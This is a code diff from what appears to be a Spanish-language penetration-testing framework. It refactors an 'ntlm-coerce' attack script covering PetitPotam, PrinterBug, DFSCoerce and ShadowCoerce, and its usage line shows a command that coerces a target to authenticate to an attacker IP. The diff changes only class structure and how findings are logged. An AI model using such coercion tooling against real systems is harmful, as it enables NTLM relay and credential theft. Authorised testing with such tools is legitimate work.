@@ -16,6 +16,7 @@ Uso:
   python lobera.py smb -t 10.10.10.5 --script=ntlm-coerce --technique dfscoerce --attacker-ip 10.10.10.99
 """
 
+from scripts.base import BaseScript
 from core.output import console
 from core import session_db
 
@@ -284,22 +285,20 @@ def _shadowcoerce(target, user, password, domain, lm_hash, nt_hash, attacker_ip)
 
 # ── Script principal ───────────────────────────────────────────────────────────
 
-class Script:
-    NAME        = "ntlm-coerce"
-    DESCRIPTION = "Coerción NTLM: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce"
+class Script(BaseScript):
+    name        = "ntlm-coerce"
+    protocol    = "smb"
+    category    = "attack"
+    description = "Coerción NTLM: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce"
 
-    def __init__(self, target, creds):
-        self.target = target
-        self.creds  = creds
-
-    def run(self, args):
+    def run(self, **kwargs):
         target      = str(self.target.ip)
-        user        = getattr(args, "user",        None) or (self.creds.username if self.creds else None)
-        password    = getattr(args, "password",    "") or (self.creds.password if self.creds else "")
-        domain      = getattr(args, "domain",      "") or (self.creds.domain if self.creds else "")
-        hash_       = getattr(args, "hash",        None)
-        technique   = getattr(args, "technique",   "petitpotam") or "petitpotam"
-        attacker_ip = getattr(args, "attacker_ip", None)
+        user        = self.creds.user or kwargs.get("user")
+        password    = self.creds.password or kwargs.get("password", "")
+        domain      = self.creds.domain or kwargs.get("domain", "")
+        hash_       = self.creds.hash or kwargs.get("hash")
+        technique   = kwargs.get("technique", "petitpotam") or "petitpotam"
+        attacker_ip = kwargs.get("attacker_ip")
 
         if not attacker_ip:
             console.print("[red]Falta --attacker-ip <IP del atacante>[/red]")
@@ -335,11 +334,7 @@ class Script:
         success = fn(target, user or "", password, domain, lm_hash, nt_hash, attacker_ip)
 
         if success:
-            session_db.save_finding(
-                category="ntlm-coerce",
-                data={
-                    "target":      target,
-                    "technique":   technique,
-                    "attacker_ip": attacker_ip,
-                }
+            session_db.DB.SaveFinding(
+                target, "SMB", "ntlm_coerce",
+                f"technique={technique} attacker={attacker_ip}"
             )
